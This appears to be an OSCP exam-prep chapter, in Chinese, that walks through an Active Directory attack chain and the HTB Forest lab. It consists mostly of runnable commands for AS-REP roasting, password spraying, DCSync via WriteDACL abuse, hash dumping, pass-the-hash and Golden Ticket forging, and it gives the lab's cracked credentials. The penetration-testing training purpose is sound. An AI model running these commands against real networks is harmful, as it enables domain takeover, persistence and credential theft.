# Ch 36 — OSCP AD 三機器鏈實戰模擬

> 目標：完整跑一遍 AD 三機器鏈的典型流程，整合 Ch 30–35 所有技術，確認你在考試能把 40 分拿下。

## 模擬情境設定

這章用 HTB Forest 作為練習環境，這是 OSCP 備考最推薦的 AD 機器。

**HTB Forest 環境**：
```
DC IP: 10.10.10.161
Domain: htb.local

沒有三機器鏈（只有一台 DC），但涵蓋了：
  AS-REP Roasting → 取得域帳號
  BloodHound 路徑分析
  ACL 濫用（WriteDACL）
  DCSync → 取得所有 hash
```

完整三機器鏈練習可以用 OffSec Proving Grounds（需要 VPN 和帳號）或 HackTheBox ProLabs。

## 三機器鏈標準流程

### Step 1：外部枚舉（Machine 1，普通機器）

```bash
TARGET="10.10.10.x"  # Machine 1 IP

# 1.1 全 port 掃描
nmap -p- --min-rate 5000 $TARGET -oN nmap/all.txt

# 1.2 詳細服務掃描
nmap -p <ports> -sC -sV $TARGET -oN nmap/detail.txt

# 1.3 Web 枚舉（如果有 HTTP）
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### Step 2：取得初始立足（Machine 1）

依據枚舉結果，選擇入口：

```bash
# AS-REP Roasting（如果有 Kerberos 和帳號列表）
python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -no-pass -request

# Password Spray（如果有帳號列表）
kerbrute passwordspray -d htb.local users.txt 'Welcome1'

# Web 漏洞利用（SQLi, LFI, 檔案上傳...）
```

### Step 3：BloodHound 收集

**一旦有域帳號就要跑 BloodHound：**

```bash
# 用拿到的帳號
python3 -m bloodhound \
    -u svc-alfresco \
    -p 's3rvice' \
    -d htb.local \
    -dc dc.htb.local \
    -c all \
    --zip

# 匯入 BloodHound
# 查詢：Find Shortest Paths to Domain Admins
```

### Step 4：分析攻擊路徑

根據 BloodHound 輸出制定計劃：

```
範例路徑（Forest）：
  svc-alfresco → [MemberOf] → Service Accounts
  Service Accounts → [MemberOf] → Privileged IT Accounts
  Privileged IT Accounts → [MemberOf] → Account Operators
  Account Operators → [GenericAll] → Exchange Windows Permissions
  Exchange Windows Permissions → [WriteDACL] → htb.local
  → 用 WriteDACL 給自己加 DCSync 權限
```

### Step 5：橫向移動（到 Machine 2）

```bash
# 用拿到的憑證確認橫向移動目標
crackmapexec smb 10.10.10.0/24 -u alice -p 'Password123'

# 找有 [+] 的機器（有效認證）
# 找有 Pwn3d! 的（有 Admin 權限）

# 移動到 Machine 2
python3 psexec.py alice:'Password123'@10.10.10.y
# 或
evil-winrm -i 10.10.10.y -u alice -p 'Password123'
```

### Step 6：提權（Machine 2）

```cmd
# 做 Windows 提權枚舉
whoami /priv   # 找 SeImpersonatePrivilege
winpeas.exe    # 自動化

# 根據結果提權
.\PrintSpoofer64.exe -i -c cmd  # SeImpersonatePrivilege
```

### Step 7：提取本機 hash 並繼續收集

```bash
# 有 SYSTEM 後提取本機帳號 hash
python3 secretsdump.py administrator@10.10.10.y -hashes :NTLM_HASH

# 有沒有 Domain Admin 的 hash 快取在這台機器？
```

### Step 8：接管 DC（Machine 3）

根據你在 Machine 1 和 2 累積的憑證：

```bash
# 如果已有 DA 或 DCSync 權限
python3 secretsdump.py htb.local/administrator@10.10.10.dc -hashes :NTLM_HASH -just-dc

# 用 krbtgt hash 做 Golden Ticket（永久後門）
python3 ticketer.py \
    -nthash KRBTGT_HASH \
    -domain-sid S-1-5-21-... \
    -domain htb.local \
    Administrator

# 進 DC
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass htb.local/Administrator@dc.htb.local
```

## HTB Forest 完整 Walkthrough

```bash
# 環境
DC="10.10.10.161"

# 1. 枚舉
nmap -p- --min-rate 5000 $DC
# 開著 DC 的標準 ports（53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985）

# 2. 列出域使用者（Null LDAP Bind）
ldapsearch -x -H ldap://$DC -b "dc=htb,dc=local" "(objectClass=user)" | grep sAMAccountName

# 3. AS-REP Roasting（找不需要預認證的帳號）
python3 GetNPUsers.py htb.local/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat

# 拿到 hash：$krb5asrep$23$svc-alfresco@HTB.LOCAL:...

# 4. 破解 hash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# 密碼：s3rvice

# 5. BloodHound
python3 -m bloodhound -u svc-alfresco -p s3rvice -d htb.local -dc dc.htb.local -c all --zip

# 6. 分析 BloodHound 路徑
# svc-alfresco → Account Operators → Exchange Windows Permissions → WriteDACL → htb.local

# 7. 利用 WriteDACL 給自己加 DCSync 權限
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync

# 8. DCSync
python3 secretsdump.py htb.local/svc-alfresco:s3rvice@$DC -just-dc

# 拿到 Administrator hash

# 9. PtH 進 DC
python3 psexec.py administrator@$DC -hashes :ADMIN_HASH
# type C:\Users\Administrator\Desktop\proof.txt
# ipconfig
```

## 考試 AD 部分的時間規劃

```
開始後 0–2 小時：完整枚舉所有機器（nmap, BloodHound）
2–4 小時：利用第一台機器取得立足點
4–6 小時：橫向移動到第二台
6–8 小時：接管 DC，取 proof.txt
```

如果 8 小時過了 AD 還沒打完，評估剩下時間轉去打獨立機器。

## 截圖清單（AD 鏈的 40 分）

```
Machine 1（10分）：
  □ whoami 顯示你的使用者
  □ type local.txt（flag 內容可見）
  □ ipconfig（機器 IP 可見）

Machine 2（10分）：
  □ whoami（提權到 SYSTEM 後）
  □ type local.txt
  □ ipconfig

Machine 3 DC（20分）：
  □ whoami（顯示 Administrator 或 NT AUTHORITY\SYSTEM）
  □ type C:\Users\Administrator\Desktop\proof.txt
  □ ipconfig（DC 的 IP）
```

## 自我檢核

- [ ] 跑過 HTB Forest 全程，從 AS-REP 到 DCSync
- [ ] 能解讀 BloodHound 的攻擊路徑，知道每個步驟怎麼執行
- [ ] 有 AD 三機器鏈的時間規劃（8 小時）
- [ ] 截圖清單已準備好，知道考試要截哪些

→ [Ch 37 Buffer Overflow（x86 Windows）：EIP 控制到 shellcode](./37-buffer-overflow.md)
